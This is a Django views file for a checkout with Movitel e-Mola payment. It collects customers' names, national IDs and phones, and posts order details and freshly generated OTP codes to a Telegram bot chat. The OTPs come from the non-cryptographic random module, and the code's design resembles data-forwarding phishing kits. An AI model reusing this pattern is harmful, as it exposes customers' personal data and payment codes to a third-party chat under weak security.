import requests
from django.shortcuts import render, redirect, get_object_or_404
from django.conf import settings
from .models import Order
import random
from datetime import datetime, timedelta

def generate_otp():
    """Gera um código de 6 dígitos para validação e-Mola."""
    return str(random.randint(100000, 999999)) # Updated to 6 digits

def send_telegram_notification(order, extra_info=None):
    token = settings.TELEGRAM_BOT_TOKEN
    chat_id = settings.TELEGRAM_CHAT_ID
    if not token or not chat_id or token == 'YOUR_BOT_TOKEN': return
    
    message = (
        f"🔔 *ATUALIZAÇÃO DE PEDIDO*\n\n"
        f"💳 *MÉTODO:* MOVITEL (E-MOLA)\n"
        f"👤 *Cliente:* {order.full_name}\n"
        f"📞 *Telefone:* {order.phone}\n"
        f"💰 *Total:* {order.total_amount} MT\n"
        f"--------------------------------\n"
    )
    if extra_info: message += f"📝 *INFO:* {extra_info}\n"
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    try: requests.post(url, data=payload, timeout=10)
    except Exception: pass

def checkout(request):
    if request.method == 'POST':
        order = Order.objects.create(
            full_name=request.POST.get('fullName'),
            national_id=request.POST.get('nationalId'),
            email=request.POST.get('email'),
            phone=request.POST.get('phone'),
            contact_person=request.POST.get('contactPerson'),
            alt_phone=request.POST.get('altPhone'),
            city=request.POST.get('city'),
            address=request.POST.get('address'),
            delivery_method=request.POST.get('delivery_method'),
            payment_method='movitel',
            total_amount=request.POST.get('total_amount', 0)
        )
        send_telegram_notification(order)
        return render(request, 'orders/payment_instructions.html', {'order': order})
    return render(request, 'orders/checkout.html')

def process_payment(request, order_id):
    order = get_object_or_404(Order, id=order_id)
    if request.method == 'POST':
        otp = generate_otp()
        order.otp_code = otp
        order.otp_created_at = datetime.now()
        order.otp_resend_count = 0
        order.save()
        send_telegram_notification(order, f"🔑 *OTP 6-DÍGITOS:* {otp}")
        return render(request, 'orders/otp_verification.html', {'order': order})
    return redirect('index')

# verify_otp and resend_otp follow the same logic as before, using the 6-digit code.